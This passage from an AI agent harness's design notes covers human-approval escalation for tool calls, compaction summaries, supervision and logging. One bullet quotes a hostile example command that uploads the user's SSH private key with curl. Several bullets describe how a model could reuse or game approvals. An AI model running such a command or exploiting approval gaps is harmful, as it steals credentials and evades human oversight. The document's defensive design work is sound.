  two questions are separate on purpose. Raising is unconditional and
  deduplicated by a digest of `{strand, tool, wanted diff}`, so a model
  that retries lands on the record already pending instead of one row per
  attempt, and the in-band error stands alongside it. *Parking* — holding
  the call open until a human decides — happens only when
  `Config.interactive` says someone is attached, because a parked call in
  a headless session is a hang. Which raised records actually interrupt a
  person stays a client-surface decision: the hub already emits
  escalation events and lists pending ones in its snapshot, so approval
  fatigue is tunable in a UI rather than frozen in a deploy.
- **An approval is consent about an *action*, not about a want.** The
  record id digests `{strand, tool, wanted diff}` and says nothing about
  the command behind it, so two calls that differ only in what they run
  land on one row — which is right for deduplication and catastrophic
  for consent: a yes given to `bash "true"` would otherwise be spendable
  by `bash "curl -T ~/.ssh/id_rsa …"` in a different operation, later in
  the session (#65). So a raise carries `action_digest` of the call's
  effective arguments alongside the id, the record stores it, and only a
  claimant that digests the same inherits the approval. Anything else
  re-opens the record as a fresh `Pending` question bound to the new
  action, and the model sees the byte-identical in-band refusal a first
  denial produces — it must never be able to observe that an approval
  existed and was set aside. Nothing is excluded from the digest: a
  field the consent layer overlooks is a field the model may vary after
  consent. `escalate.spend` re-checks the binding beside the scope check
  and, on failure, settles in band leaving the record untouched.
- **Re-opening is bounded, because the party provoking it is the party
  being constrained.** The mismatch edge above is a *new* way into
  `Pending`, so `Config.max_asks` (3) caps the questions one row may put
  and the claim comes back `Exhausted` past it: nothing written, nobody
  asked, the call settled in band (#66).
- **A claim's checks and its commit are the same read.** The park loop
  reads an `api.EscalationCell` and spends through
  `api.consume_escalation_at`, which CASes at that seq, so a claim
  landing between the scope-and-action checks and the consume loses the
  commit instead of passing unseen (#68).
- **And so is an approval's.** `approve` carries the diff and the action
  digest the client *rendered*; `gateway.approve` reads one
  `api.EscalationCell`, checks the echo against that value, and commits
  the `Approved` write CAS-guarded at that same seq — which is why it
  builds the transaction itself rather than calling
  `api.approve_escalation`, whose own read the checks would not be about.
  A refreshing claim is exactly what makes the check mean something: it
  changes what the record wants and bumps the register seq, so it either
  fails the echo or loses the commit. A mismatch answers
  `stale_approval` with the fresh record in `details` and writes nothing
  (`protocol-change/007`, #72). The record's `CallScope` is also what
  `op`/`strand` on the wire now come from, in place of a guess at which
  strand was busy (#67).
- **A raise *claims* the record; the scope is the call standing at the
  door now.** The digest deliberately excludes the call id, so under a
  retry the row is already there when a refusal arrives — and the call
  that opened it has already settled, because a model that reads an
  in-band refusal retries under a call id the provider mints fresh. So
  `api.claim_escalation` moves the scope to the live call under a CAS
  instead of refusing the duplicate: a pending record moves and refreshes
  its stored denial, an approved one moves and keeps its grants, and a
  consumed or rejected one re-opens as a new question with no grants.
  Without that the ordinary first-run sequence — refusal with nobody
  attached, a human attaching and approving, the model retrying — leaves
  an approved record scoped to a call that will never come back, which
  nothing can ever spend and nothing can ever replace (the register is
  write-once and there is no delete path). Two consequences are
  deliberate: two calls wanting the same thing at once share one prompt
  and therefore one authorization, and approving a want does not make it
  unaskable — the next call wanting it asks again, because a standing
  permission is a wider base policy rather than an approval that never
  expires.
- **The escalation set is bounded on both axes, because two constantly
  running paths scan the whole `escalation/` prefix** — a tool clearance
  looking for approvals attributed to it, and the gateway's pull turning
  new records into events. *Width*: a limit grant contributes its
  **field** and not its magnitude to the dedup digest, because `bash`
  turns a model-supplied `timeout_ms` into the `wall_s` it asks for, and
  under a narrow base that number reaches the wanted diff — a retry loop
  stepping it would otherwise mint a record, and a prompt, per attempt.
  The magnitude still reaches the human: it is in the record's stored
  denial, which is what an approval is granted against. *Count*:
  `Config.max_records` caps the distinct wants a session will file, and
  past the cap a refusal that would open a **new** record settles in
  band; one that lands on a record already there costs no row and is
  never turned away.
- **A park waits on the tool's own effect process, never on the driver.**
  `Hooks.run_end` is not the only thing that must not block `drive_loop`:
  a driver stuck inside a clearance stops serving `Nudge`,
  `RequestAbort` and `PollTick`, so a human who changed their mind could
  not abort the run they are being asked about. Parking in the broker
  seam — inside `Ctx.clear_call`, on the process the driver spawned and
  monitors — also means the wait needs no timer and leaks no process: the
  effect process is linked to the driver's reaper, so an abort or a
  driver restart kills the parked call and the driver settles it in band
  through the ordinary monitor path.
- **A park is bounded by the configured window *and* by the call's own
  budget deadline, and the deadline is re-read immediately before the
  consuming commit.** The second bound is not politeness: the broker's
  ledger refuses a reservation past `deadline_ms`, so a re-clearance
  after that instant is a `BudgetRefused`, not a resumption, and holding
  a call past it would trade an honest "policy refused" for a confusing
  "deadline passed". The re-read is the same fact one step further in:
  the consume is a writer round trip, so a slice admitted just inside the
  window could otherwise commit `Consumed` on its way to a budget
  refusal, spending an approval on an execution that never happens. Both
  bounds are read from the session's own clock, which is why the seam
  must share it (spec §0.2). What the budget bounds is *admission*, not
  total elapsed time: a resumed call re-enters `reserve_budget` with its
  `CallSpec` unchanged and gets the original `wall_s`, so a parked call's
  lifetime is `park + wall`.
- **An approval buys exactly one re-clearance, of exactly one call.** The
  record's `CallScope` is checked — exact equality — before anything is
  spent, so a call that lost the claim to another call cannot burn the
  approval that other call is standing at; the consume is a CAS that must
  win *before* the grants compose into a policy; and the resumed call is
  cleared once, not retried in a loop — if the widened policy still does
  not satisfy the tool, the second refusal stands in band. Only a call
  whose denial digests to the record's own id can ever hold the claim, so
  "one call" is always a call wanting the same thing on the same strand
  through the same tool, and the grants it spends are the ones a human
  chose rather than its own. A lost CAS, a lost claim, a decode failure,
  a denial, a closed window, a passed budget deadline, a disconnected
  client, an unanswering hub and a crash all end in the same in-band
  refusal.
- **Asking another process a question never kills the asker.**
  `process.call` exits its *caller* on timeout rather than returning an
  error, and both questions this package asks on a parked call's own
  effect process — `gateway.attached` once a second for the length of the
  park, and `escalate.borrow` once per refusal — would therefore turn a
  merely slow answer into a dead tool call, settled by the driver as a
  death with no stated reason where the seam's doc promises an in-band
  policy refusal. Both send and select by hand instead, watching the
  callee's monitor: absent, dead, dying mid-answer and too slow all
  degrade to "nobody is there", which un-parks the call and settles it.
- **Compaction is answered by these seams, and by nothing that supplies
  its own summary.** `compaction_hooks` returns `VerdictGenerate` for
  every structural decision: `VerdictSupplied` exists for a host that
  brings its own summarizer, and a harness that used it here would be
  answering its own compaction. The M3 demo installs *these* hooks over
  its scripted provider — it has no `demo_hooks` of its own — so the
  `CompactionEntry` it asserts on carries text that came off the wire.
- **A summary request carries no system prompt and no tool array**, and
  its whole content is one assembled user message. Both one-hour cache
  breakpoints hang on the two positions it omits, so a prompt read
  exactly once writes no long-lived cache entry and cannot disturb the
  session's own pinned head (pi's `cacheRetention: "none"`, expressed as
  a request shape). The residual cost is the adapter's rolling
  five-minute mark on that single user turn; removing it needs a
  request-level cache flag in `provider`, which this stage did not open.
- **Summaries route through the `Summarize` role when one is
  configured**, resolved to a concrete identity at dispatch, and fall
  back to the strand's own captured identity when it is not. Unlike a
  generation there is no durable identity contract to honour: the
  summary is published as text, not as a response attributed to a model.
- **A summary the sink does not hold is a retryable failure, never an
  empty summary.** `SummaryProduced(summary: "")` would publish a
  `CompactionEntry` that silently replaced a conversation with a blank;
  asking the provider again costs one request. That is also why the
  record is filed *before* the terminal event is forwarded to the effect
  process: by the time the driver asks for progress, the text is already
  there. A crash, a reaped effect, or an evicted record all read as
  `Absent` and retry, which is exactly what the machine does for an
  orphaned summary request.
- **A summary response that reached for a tool is a failed attempt.**
  The summarizer was sent no tool array, so a call in its answer means
  it did something other than summarize, and publishing its prose would
  be guessing. So is an answer with no text.
- **The operator's `compact` instructions reach the provider from the
  operation's durable state**, not from the preparation:
  `StructuralPreparation` has no field for them, because the preparation
  is the *input* the decision hook froze and the instructions are a
  property of the operation that asked.
- **A manual `compact` cuts where an automatic one cuts.** The hub's
  preparation goes through `runtime/hooks.preparation` — the same
  builder the threshold and overflow hooks use — against the run's own
  settings snapshot.
- **The server has two supervision tiers, and the line between them is
  reachability.** A child under `Booted.services` — the commit
  forwarder, the Agency holder, the escalation holder, the gateway hub —
  is addressed by
  *name*, so a replacement under that name is the same address and a
  crash costs hints and the sockets already attached to the old hub
  rather than the server. The helper pool, the broker, and the summary
  sink are captured *by value* into closures built during the boot, so a
  replacement would be unreachable by everything already holding the old
  handle: restarting one leaves a server that looks alive and refuses
  every call, and failing closed is the posture the effect plane wants
  anyway. Those are fatal, along with the session tree, the listener,
  and the service supervisor once its own budget is spent.
- **A fatal death is an orderly shutdown, not a side effect.** The host
  traps exits, so a child's death is a message: it runs the whole
  teardown — listener, services, runtime (which releases the writer
  lease), broker, pool, sink — *before* reporting, and the entry point
  exits nonzero afterwards. The one case this cannot cover is the
  storage actor's own death, because it is the connection that would
  delete the lease row.
- **The entry point has two output channels, and the split is
  deliberate** (§3.4). **stdout** carries the startup banner and nothing
  else — the ephemeral port, the token path, the prompt digest — because
  that is this process's contract with whoever launched it and a
  supervisor script reads it with `head -1`. **The log stream** carries
  everything about the running system, as JSON, one event per line, all
  of it correlated to the session. A *usage* error is on neither side of
  that split: it belongs to the person who mistyped a flag, before there
  is a session to correlate anything to, so it stays on stderr with the
  usage text. Everything downstream of a successful flags parse — the
  boot failure, the SIGTERM stop, a fatal child, an absent code-mode
  toolchain, a prompt-pack warning — is a log line.
- **The handler is installed before anything can fail.** `main`'s first
  act is `handler.install`, so no line of a boot lands on the VM's
  default text formatter; `LOOM_LOG_LEVEL` sets the threshold and an
  unrecognised value falls back to `info` rather than refusing to boot.
- **Only an entry point installs the signal handler.** `wait_for_sigterm`
  replaces the VM's default `erl_signal_handler`, whose answer to
  `SIGTERM` is an immediate `init:stop()`, so `boot` never touches it —
  `main` does, through `host.relay_sigterm`, and a test that boots a
  server leaves the node's signal handling alone.

## Deep Docs

- [docs/architecture/orchestration.md](../../docs/architecture/orchestration.md)
  — the runtime surface the hub dispatches onto.
- [docs/architecture/durability.md](../../docs/architecture/durability.md)
  — seqs, write-once rows, and why the event stream needs no side index.
- [docs/spec-gaps.md](../../docs/spec-gaps.md) — "From WP-L (`client`)":
  the missing compaction/navigation api entry points, brief-less strand
  creation, protocol fork forking in place, fixture-versus-codec drift,
  queued-versus-placed acks, and the provider delta tap.
- [protocol-change/007-escalation-carries-the-action.md](../../protocol-change/007-escalation-carries-the-action.md)
  — why `escalation` carries the tool, the action digest and a bounded
  argument preview, why `approve` echoes them, and the rendering rules
  that bind any client showing a preview.
- [docs/design-notes/agent-comms-and-system-prompt.md](../../docs/design-notes/agent-comms-and-system-prompt.md)
  — Part B: the pack's sections, the stability contract, and why
  the prompt is pinned rather than re-derived.
- [docs/review/m5-agent-comms-judgment.md](../../docs/review/m5-agent-comms-judgment.md)
  — change items 5 and 6, which the sandbox wording and the
  pin-around-the-lease ordering follow.
- [docs/architecture/code-mode.md](../../docs/architecture/code-mode.md) —
  the pipeline `client/codemode` wires, and what each layer confines.
- [packages/codemode/CLAUDE.md](../codemode/CLAUDE.md) — the pipeline's
  own package.
- [docs/design-notes/compaction-and-memory.md](../../docs/design-notes/compaction-and-memory.md)
  — Stage C0: which seams were inert, what each hook now decides from,
  and the cache arithmetic the summary request's shape follows.
- [packages/prompt/CLAUDE.md](../prompt/CLAUDE.md) — the pure half:
  the pack format, the renderer, the summarization pack, and what
  `Environment` may never grow.
- [packages/tui/CLAUDE.md](../tui/CLAUDE.md) — the other end of the wire.
- [Root CLAUDE.md](../../CLAUDE.md) — repo ground rules and the doc graph.
